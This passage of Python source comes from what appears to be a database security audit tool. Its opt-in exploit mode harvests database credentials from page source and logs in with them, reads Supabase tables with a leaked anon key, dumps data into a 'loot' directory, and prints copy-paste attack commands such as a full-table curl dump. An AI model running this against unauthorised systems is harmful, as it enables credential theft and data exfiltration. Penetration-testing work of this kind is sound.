            f"{fingerprint!r}. Full dump available via --exploit (sqlmap).",
            Severity.CRITICAL, "Use parameterised queries.",
            "extraction", parameter=inj.param, sql_fingerprint=fingerprint,
            url=inj.url, evidence_file=evidence))
    return findings


# Harvested DB credentials from connection strings: scheme://user:pass@host:port
_HARVEST_RE = re.compile(
    r"(mysql|mariadb|postgres(?:ql)?|mongodb(?:\+srv)?|redis)://([^:@/\s]+):([^@/\s]+)@"
    r"([^:/\s]+)(?::(\d+))?", re.I)


def _harvest_credentials(engine: ScanEngine) -> list[tuple]:
    """Pull (scheme, user, pass, host, port) tuples from connection strings in page source."""
    try:
        blob = "\n".join(engine.get_crawl().pages.values())
    except Exception:  # noqa: BLE001
        return []
    out, seen = [], set()
    for scheme, user, pwd, host, port in _HARVEST_RE.findall(blob):
        key = (user, pwd, host, port)
        if key in seen:
            continue
        seen.add(key)
        out.append((scheme.lower(), user, pwd, host, int(port) if port else 0))
    return out


def _try_db_login(scheme: str, user: str, pwd: str, host: str, port: int) -> bool:
    """Attempt a real connection with harvested credentials (optional drivers; graceful)."""
    try:
        if scheme.startswith(("mysql", "maria")):
            import pymysql  # type: ignore  # noqa: PLC0415
            pymysql.connect(host=host, port=port or 3306, user=user, password=pwd,
                            connect_timeout=4).close()
            return True
        if scheme.startswith("postgres"):
            import psycopg2  # type: ignore  # noqa: PLC0415
            psycopg2.connect(host=host, port=port or 5432, user=user, password=pwd,
                             connect_timeout=4).close()
            return True
        if scheme.startswith("redis"):
            resp = _tcp_send_recv(host, port or 6379, f"AUTH {user} {pwd}\r\n".encode("latin-1"))
            return b"+OK" in resp
    except ImportError:
        logger.debug(f"db_security: no driver to reuse creds for {scheme}")
    except Exception as exc:  # noqa: BLE001
        logger.debug(f"db_security: cred-reuse {scheme}://{host} failed: {exc}")
    return False


def _exploit_cred_reuse(engine: ScanEngine) -> list[Finding]:
    """Replay credentials harvested from the site against their own database hosts."""
    findings: list[Finding] = []
    for scheme, user, pwd, host, port in _harvest_credentials(engine):
        if _try_db_login(scheme, user, pwd, host, port):
            findings.append(_f(
                f"Credential Reuse — Harvested Creds Open {scheme.upper()}: {host}",
                f"Credentials leaked in the site source ({user}:***@{host}) successfully "
                f"authenticated to the live {scheme} database — full access confirmed.",
                Severity.CRITICAL,
                "Rotate the exposed credentials and remove them from client-side code.",
                "cred_reuse", host=host, port=port, engine=scheme,
                reused_credential=f"{user}:***", confidence="high",
                evidence=[f"connected to {scheme}://{host} with harvested credentials {user}:***"],
                exploitation=_db_exploitation("creds_leak", host=host, port=port,
                                              desc="Connect directly to the live database with the reused credentials.",
                                              cmd=f"{scheme} client → {user}@{host}")))
    return findings


_SUPABASE_TABLES = ("users", "profiles", "todos", "posts", "messages", "customers", "accounts", "orders")


def _exploit_supabase(engine: ScanEngine, loot: Path | None) -> list[Finding]:
    """Replay the harvested Supabase anon key against the REST API — readable rows prove RLS is OFF."""
    try:
        blob = "\n".join(engine.get_crawl().pages.values())
    except Exception:  # noqa: BLE001
        return []
    projects = set(_SUPABASE_RE.findall(blob))
    keym = _SUPABASE_KEY_RE.search(blob)
    if not projects or not keym:
        return []
    proj, key = list(projects)[0], keym.group(1)
    for table in _SUPABASE_TABLES:
        url = f"https://{proj}.supabase.co/rest/v1/{table}?select=*&limit=3"
        try:
            r = engine.request("GET", url, timeout=8.0,
                               headers={"apikey": key, "authorization": f"Bearer {key}"})
        except httpx.HTTPError:
            continue
        if r.status_code == 200 and r.text.strip().startswith("[") and r.text.strip() not in ("[]", ""):
            evidence_file = _save_evidence(loot, f"supabase_{proj}_{table}.json", r.text[:8000])
            return [_f(
                f"Supabase RLS Disabled — Table '{table}' World-Readable: {proj}",
                f"The public anon key read rows from '{table}' on {proj}.supabase.co — Row-Level Security "
                "is OFF, so the embedded anon key exposes (and likely lets anyone write) the data.",
                Severity.CRITICAL,
                "Enable restrictive Row-Level Security on every Supabase table immediately.",
                "cloud_db", project=proj, table=table, url=url, proof_url=url, evidence_file=evidence_file,
                evidence=ev.from_response(r, indicator=f"anon key returned rows from '{table}' — RLS off"),
                exploitation=_db_exploitation("cloud_db", desc="Dump the whole table with the anon key.",
                                              cmd=f"curl '{url.replace('limit=3', 'limit=10000')}' -H 'apikey: <anon_key>'"))]
    return []


# ---------------------------------------------------------------------------
# TLS on DB ports
# ---------------------------------------------------------------------------

def _check_tls(host: str, port: int) -> list[Finding]:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with socket.create_connection((host, port), timeout=4) as raw:
            with ctx.wrap_socket(raw, server_hostname=host) as tls:
                cert = tls.getpeercert(binary_form=True)
                if cert:
                    return [_f(f"DB Port TLS — Self-Signed/Unverified: {host}:{port}",
                               f"{host}:{port} offers TLS but the certificate is not trusted (self-signed).",
                               Severity.LOW, "Use a CA-signed certificate for database TLS.",
                               "tls", host=host, port=port)]
    except (ssl.SSLError, OSError):
        return [_f(f"DB Port Without Direct TLS: {host}:{port}",
                   f"{host}:{port} is open but did not complete a TLS handshake. Traffic may be "
                   "unencrypted (note: DB-native STARTTLS is not detected by this check).",
                   Severity.MEDIUM, "Enable and require TLS for database connections.",
                   "tls", host=host, port=port)]
    return []


# ---------------------------------------------------------------------------
# Version → CVE correlation (high-signal DB RCE / auth-bypass CVEs)
# ---------------------------------------------------------------------------

# Each entry fires when a fingerprinted banner version of *engine* falls in [min, max).
_DB_CVES: list[dict] = [
    {"engine": "Redis", "max": (7, 0, 0), "cve": "CVE-2022-0543",
     "impact": "Lua sandbox escape → remote code execution (Debian/Ubuntu packaging)"},
    {"engine": "Elasticsearch", "max": (1, 4, 3), "cve": "CVE-2015-1427",
     "impact": "Groovy scripting sandbox bypass → remote code execution"},
    {"engine": "CouchDB", "max": (2, 1, 1), "cve": "CVE-2017-12636",
     "impact": "admin privilege escalation → remote code execution"},
    {"engine": "PostgreSQL", "min": (9, 3, 0), "max": (11, 99, 0), "cve": "CVE-2019-9193",
     "impact": "COPY TO/FROM PROGRAM → OS command execution (superuser)"},
    {"engine": "MySQL", "max": (5, 6, 0), "cve": "CVE-2012-2122",
     "impact": "authentication bypass via repeated login on affected builds"},
    {"engine": "Cassandra", "min": (3, 0, 0), "max": (4, 1, 0), "cve": "CVE-2021-44521",
     "impact": "RCE via scripted user-defined functions when enabled"},
    {"engine": "MongoDB", "max": (2, 4, 0), "cve": "CVE-2013-1892",
     "impact": "native-code execution via unauthenticated nativeHelper.apply"},
]


def _ver_tuple(s: str) -> "tuple[int, int, int] | None":
    parts = [int(p) for p in re.findall(r"\d+", s)[:3]]
    if not parts:
        return None
    while len(parts) < 3:
        parts.append(0)
    return (parts[0], parts[1], parts[2])


def _check_versions(ip: str, open_ports: list["_OpenPort"]) -> list[Finding]:
    """Correlate a fingerprinted DB version against known high-impact CVEs (RCE / auth bypass)."""
    findings: list[Finding] = []
    for op in open_ports:
        vt = _ver_tuple(op.version) if op.version else None
        if not vt:
            continue
        for cve in _DB_CVES:
            if cve["engine"] not in op.engine:
                continue
            if "max" in cve and vt >= cve["max"]:
                continue
            if "min" in cve and vt < cve["min"]:
                continue
            findings.append(_f(
                f"Known Vulnerability — {op.engine} {op.version}: {cve['cve']}",
                f"{op.engine} {op.version} on {ip}:{op.port} falls in the affected range for "
                f"{cve['cve']}: {cve['impact']}. Verify the exact build, then exploit on an authorised target.",
                Severity.HIGH,
                f"Upgrade {op.engine} to a patched release and restrict network access.",
                "cve", host=ip, port=op.port, engine=op.engine, version=op.version,
                cve_id=cve["cve"], cve_impact=cve["impact"], proof_url="",
                evidence=[f"banner version: {op.engine} {op.version}",
                          f"within the affected range for {cve['cve']}"],
                exploitation=_db_exploitation("admin", host=ip, port=op.port,
                                              desc=f"Find and run a public exploit for {cve['cve']}.",
                                              cmd=f"searchsploit {cve['cve']}   # exploit-db / Metasploit for {op.engine} {op.version}"),
                exploit_cmd=f"searchsploit {cve['cve']}"))
    return findings


# ---------------------------------------------------------------------------
# Exposure score
# ---------------------------------------------------------------------------

def _exposure_score(findings: list[Finding]) -> tuple[int, str]:
    seen = {f.raw.get("db_category") for f in findings}
    score = min(100, sum(pts for cat, pts in _SCORE.items() if cat in seen))
    grade = ("SECURE" if score <= 15 else "AT RISK" if score <= 40
             else "EXPOSED" if score <= 70 else "CRITICAL")
    return score, grade


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def run(engine: ScanEngine) -> list[Finding]:
    safe = is_safe_mode(engine)
    findings: list[Finding] = []

    def guard(fn, *a):
        try:
            findings.extend(fn(*a))
        except Exception as exc:  # noqa: BLE001 — one failing check must not crash db_scan
            logger.warning(f"db_security: {fn.__name__} failed: {exc}")

    if safe:
        findings.append(_f("Safe Mode Active — Destructive DB Tests Skipped",
                           "Default-credential, time-based SQLi and NoSQL tests were skipped, and the "
                           "port scan was limited to the top 5 DB ports.",
                           Severity.INFO, "Re-run without safe mode on an authorised target for the full audit.",
                           "info"))

    hostname = urlparse(engine.url).hostname or ""
    ip = _resolve(hostname)

    open_ports: list[_OpenPort] = []
    if ip:
        try:
            # If the host answers random unused ports (WAF/CDN/honeypot), every DB port
            # would look open — skip the scan instead of reporting false positives.
            if _is_accept_all(ip):
                logger.info(f"db_security: {ip} answers all ports — DB port scan skipped (accept-all)")
                findings.append(_f(f"DB Port Scan Unreliable — Host Answers All Ports ({ip})",
                                   f"{hostname} ({ip}) accepts connections on random unused ports — a "
                                   "firewall/IPS, CDN, or honeypot answers everything, so per-port DB "
                                   "results would be false positives. The port scan was skipped.",
                                   Severity.INFO,
                                   "Scan the real origin IP from an allowed network for accurate DB exposure results.",
                                   "info", host=ip))
            else:
                open_ports = _scan_ports(ip, safe, engine.threads)
        except Exception as exc:  # noqa: BLE001
            logger.warning(f"db_security: port scan failed: {exc}")

    for op in open_ports:
        findings.append(_f(f"Database Port Open: {op.port}/tcp ({op.engine})",
                           f"{op.engine} is listening on {ip}:{op.port}."
                           + (f" Version: {op.version}." if op.version else "")
                           + (f" Banner: {op.banner[:80]!r}." if op.banner else ""),
                           Severity.LOW, "Restrict the port to a private network or VPN.",
                           "open_port", host=ip, port=op.port, engine=op.engine, version=op.version))
        # Per-engine unauthenticated checks
        if op.engine == "Redis":
            guard(_check_redis, ip, op.port)
        elif op.engine == "Memcached":
            guard(_check_memcached, ip, op.port)
        elif op.engine == "Elasticsearch":
            guard(_check_elasticsearch, engine, ip, op.port)
        elif op.engine == "CouchDB":
            guard(_check_couchdb, engine, ip, op.port)
        elif op.engine == "MongoDB":
            guard(_check_mongodb, ip, op.port)
        elif op.engine == "ClickHouse":
            guard(_check_clickhouse, engine, ip, op.port)
        elif op.engine == "etcd":
            guard(_check_etcd, engine, ip, op.port)
        elif op.engine == "InfluxDB":
            guard(_check_influxdb, engine, ip, op.port)
        elif op.engine == "Neo4j":
            guard(_check_neo4j, engine, ip, op.port)
        elif op.engine == "Zookeeper":
            guard(_check_zookeeper, ip, op.port)
        elif op.engine == "Cassandra":
            guard(_check_cassandra, ip, op.port)
        # Default credentials (skipped in safe mode)
        if not safe and op.engine in ("MySQL/MariaDB", "PostgreSQL", "MSSQL"):
            guard(_check_default_creds, ip, op.port, op.engine)
        # TLS
        guard(_check_tls, ip, op.port)

    # Known-CVE correlation from fingerprinted DB versions (RCE / auth bypass).
    guard(_check_versions, ip, open_ports)

    # Injection surface (HTTP) — params, forms, and now headers/cookies
    guard(_check_sqli, engine, safe)
    guard(_check_injection_headers, engine, safe)   # SQLi via User-Agent/Referer/XFF/cookies
    # Skip NoSQL flagging on params already confirmed SQL-injectable (avoids double-reporting).
    sqli_params = {f.raw.get("parameter") for f in findings
                   if f.raw.get("db_category") == "sqli" and f.raw.get("parameter")}
    guard(_check_nosql, engine, safe, sqli_params)
    guard(_check_nosql_authbypass, engine, safe)     # operator-injection login bypass

    catch_all = False
    try:
        catch_all = _baseline_catchall(engine)
    except Exception:  # noqa: BLE001
        pass
    guard(_check_admin_interfaces, engine, catch_all)
    guard(_check_dump_files, engine, catch_all)
    guard(_check_framework_leaks, engine)
    guard(_check_secret_files, engine, catch_all)   # .env / database.yml / my.cnf credential leak
    guard(_check_connstrings, engine)        # hardcoded DB credentials in page/JS source
    guard(_check_graphql, engine)            # GraphQL introspection / schema disclosure
    guard(_check_cloud_db, engine)           # Firebase / Firestore / Supabase exposure

    # --- Active exploitation (opt-in via --exploit): prove impact by extracting data ---
    active = bool(getattr(engine, "exploit", False)) and not safe
    if active:
        loot = _loot_dir(engine)
        for f in list(findings):
            if f.raw.get("db_category") != "unauth":
                continue
            host, port, eng = f.raw.get("host"), f.raw.get("port"), f.raw.get("engine")
            if eng == "Redis" and host and port:
                guard(_exploit_redis, host, port, f.raw.get("sample_keys", []), loot)
            elif eng == "Elasticsearch" and host and port:
                _extend_first_scheme(findings, engine, "Elasticsearch", host, port,
                                     "/_search?size=10", loot)
            elif eng == "CouchDB" and f.raw.get("databases") and host and port:
                db0 = f.raw["databases"][0]
                _extend_first_scheme(findings, engine, "CouchDB", host, port,
                                     f"/{db0}/_all_docs?include_docs=true&limit=10", loot)
            elif eng == "MongoDB" and host and port:
                guard(_exploit_mongodb, host, port, f.raw.get("mongo_dbs", f.raw.get("databases", [])), loot)
            elif eng == "ClickHouse" and host and port:
                _extend_first_scheme(findings, engine, "ClickHouse", host, port,
                                     "/?query=SELECT%20*%20FROM%20system.tables%20LIMIT%2050%20FORMAT%20JSON", loot)
            elif eng == "etcd" and host and port:
                _extend_first_scheme(findings, engine, "etcd", host, port, "/v2/keys/?recursive=true", loot)
            elif eng == "InfluxDB" and host and port:
                _extend_first_scheme(findings, engine, "InfluxDB", host, port,
                                     "/query?q=SHOW+MEASUREMENTS", loot)
        guard(_exploit_sqli, engine, loot)        # in-band SQLi version/user/db extraction
        guard(_exploit_cred_reuse, engine)        # replay harvested creds against DB hosts
        guard(_exploit_supabase, engine, loot)    # live Supabase RLS test with the anon key

    # Exposure score
    score, grade = _exposure_score(findings)
    findings.append(_f(f"DB Exposure Score: {score}/100 ({grade})",
                       f"Database exposure score is {score}/100 — grade {grade}. "
                       "Computed from open ports, unauthenticated access, SQL/NoSQL injection "
                       "(params, forms, headers/cookies, auth-bypass), cloud DB exposure, leaked "
                       "credentials, admin interfaces, dumps, and TLS posture.",
                       Severity.INFO, "", "score", score=score, grade=grade))

    findings.sort(key=lambda f: severity_rank(f.severity.value))
    return findings


# ---------------------------------------------------------------------------
# Red-team attack plan + loot extraction
# ---------------------------------------------------------------------------

def build_playbook(findings: list[Finding]) -> list[dict]:
    """Ordered, copy-paste exploitation steps assembled from confirmed DB findings.

    Each step = {severity, title, category, command}. Only findings that carry a concrete
    next-step command (sqlmap line or exploit_cmd) become steps, so the plan is actionable.
    """
    db = [f for f in findings if f.module == MODULE]
    plan: list[dict] = []
    for f in sorted(db, key=lambda x: severity_rank(x.severity.value)):
        steps = f.raw.get("exploitation") if isinstance(f.raw.get("exploitation"), list) else []
        cmd = f.raw.get("sqlmap") or f.raw.get("exploit_cmd") or (steps[0]["command"] if steps else "")
        if not cmd and not steps:
            continue
        plan.append({"severity": f.severity.value, "title": f.title,
                     "category": f.raw.get("db_category", ""), "command": cmd,
                     "attack": f.raw.get("attack", ""), "evidence": f.raw.get("evidence_file", ""),
                     "steps": steps})
    return plan


def collect_loot(findings: list[Finding]) -> list[str]:
    """Aggregate the data actually extracted during the audit (the 'loot' a red team keeps)."""
    db = [f for f in findings if f.module == MODULE]
    loot: list[str] = []
    for f in db:
        r = f.raw
        if r.get("sample_keys"):
            loot.append(f"Redis keys ({r.get('keys_count', '?')} total): "
                        + ", ".join(r["sample_keys"][:6]))
        if r.get("indices"):
            loot.append(f"Elasticsearch indices (~{r.get('doc_count', 0)} docs): "
                        + ", ".join(r["indices"][:6]))
        if r.get("databases"):
            loot.append(f"{r.get('engine', 'DB')} databases: " + ", ".join(str(x) for x in r["databases"][:6]))
        if r.get("collections"):
            loot.append(f"MongoDB collections ({r.get('database', '?')}): "
                        + ", ".join(str(x) for x in r["collections"][:6]))
        if r.get("table"):
            loot.append(f"Supabase table readable (RLS off): {r['table']}")
        if r.get("types"):
            loot.append("GraphQL types: " + ", ".join(r["types"][:6]))
        if r.get("snippet"):
            loot.append("Leaked connection string: " + str(r["snippet"]))
        if r.get("secret_match"):
            loot.append(f"Secret in {r.get('path', 'file')}: " + str(r["secret_match"]))
        if r.get("credential"):
            loot.append(f"Default credentials {r.get('engine', '')}: " + str(r["credential"]))
        # Actively extracted evidence (--exploit mode)
        if r.get("redis_values"):
            loot.append(f"Redis values dumped ({r.get('engine', 'Redis')}): "
                        + " | ".join(str(v)[:60] for v in r["redis_values"][:3]))
        if r.get("sql_fingerprint"):
            loot.append(f"DB banner via SQLi '{r.get('parameter', '?')}': " + str(r["sql_fingerprint"]))
        if r.get("reused_credential"):
            loot.append(f"Working reused credential on {r.get('engine', '')}: " + str(r["reused_credential"]))
        if r.get("project"):
            loot.append(f"Cloud DB exposed: {r.get('project')}")
        if r.get("evidence_file"):
            loot.append(f"Evidence saved: {r['evidence_file']}")
    return loot


# ---------------------------------------------------------------------------
# Dedicated console panel (called from engine.run_scan)
# ---------------------------------------------------------------------------

_GRADE_COLOR = {"SECURE": "bold green", "AT RISK": "bold yellow",
                "EXPOSED": "bold orange3", "CRITICAL": "bold red"}


def render_panel(findings: list[Finding]) -> None:
    """Render the dedicated Database Security Audit panel. No-op if no db findings."""
    db = [f for f in findings if f.module == MODULE]
    if not db:
        return

    from rich import box  # noqa: PLC0415
    from rich.console import Console, Group  # noqa: PLC0415
    from rich.panel import Panel  # noqa: PLC0415
    from rich.table import Table  # noqa: PLC0415
    from rich.text import Text  # noqa: PLC0415

    console = Console()
    score_f = next((f for f in db if f.raw.get("db_category") == "score"), None)
    score = int(score_f.raw.get("score", 0)) if score_f else 0
    grade = score_f.raw.get("grade", "") if score_f else ""
    gcolor = _GRADE_COLOR.get(grade, "white")

    # Per-finding lines (skip the score line itself)
    lines = Text()
    for f in db:
        if f.raw.get("db_category") == "score":
            continue
        sev = f.severity.value
        port = f.raw.get("port")
        prefix = f"[{port}] " if port else ""
        lines.append(f"  [{sev.upper():<8}] ", style=_SEV_COLOR.get(sev, "white"))
        lines.append(f"{prefix}{f.title}\n")
    if not lines.plain:
        lines.append("  No database findings.\n", style="dim")

    # Score bar
    filled = round(score / 100 * 40)
    bar = Text()
    bar.append("  DB Exposure Score  ", style="bold white")
    bar.append("█" * filled, style=gcolor)
    bar.append("░" * (40 - filled), style="bright_black")
    bar.append(f"  {score}/100  ", style="bold white")
    bar.append(grade, style=gcolor)

    # Summary table
    summ = Table(box=box.SIMPLE, show_header=True, header_style="bold bright_white", padding=(0, 2))
    for col in ("Open ports", "Auth issues", "SQLi points", "Data leaks", "Admin interfaces"):
        summ.add_column(col, justify="center")
    summ.add_row(
        str(sum(1 for f in db if f.raw.get("db_category") == "open_port")),
        str(sum(1 for f in db if f.raw.get("db_category") in ("unauth", "default_creds", "cred_reuse"))),
        str(sum(1 for f in db if f.raw.get("db_category") in ("sqli", "authbypass"))),
        str(sum(1 for f in db if f.raw.get("db_category")
                in ("creds_leak", "dump", "graphql", "cloud_db", "extraction"))),
        str(sum(1 for f in db if f.raw.get("db_category") in ("admin_200", "admin_403"))),
    )

    # Loot extracted during the audit (red-team view of stolen data)
    loot = collect_loot(db)
    loot_block = Text()
    if loot:
        loot_block.append("\n  💰 Loot extracted\n", style="bold yellow")
        for item in loot[:12]:
            loot_block.append("   • ", style="yellow")
            loot_block.append(f"{item}\n", style="white")

    # Ordered exploitation plan (copy-paste commands)
    plan = build_playbook(findings)
    plan_block = Text()
    if plan:
        plan_block.append("\n  ⚔  Attack path — exploitation commands\n", style="bold red")
        for i, step in enumerate(plan[:10], 1):
            sev = step["severity"]
            plan_block.append(f"   {i}. ", style="bold white")
            plan_block.append(f"[{sev.upper()}] ", style=_SEV_COLOR.get(sev, "white"))
            plan_block.append(f"{step['title']}", style="white")
            if step.get("attack"):
                plan_block.append(f"  ⟦{step['attack']}⟧", style="magenta")
            plan_block.append("\n")
            sub = step.get("steps") or []
            if len(sub) > 1:
                for s in sub:
                    plan_block.append(f"      {s.get('step')}. {s.get('description')}\n", style="dim white")
                    plan_block.append(f"         $ {s.get('command')}\n", style="cyan")
            else:
                plan_block.append(f"      $ {step['command']}\n", style="bold cyan")
            if step.get("evidence"):
                plan_block.append(f"      ⧉ evidence: {step['evidence']}\n", style="green")

    console.print()
    console.print(Panel(Group(lines, Text(), bar, Text(), summ, loot_block, plan_block),
                        title="[bold red]🛢  Database Security Audit[/bold red]",
                        border_style=gcolor, padding=(1, 2)))
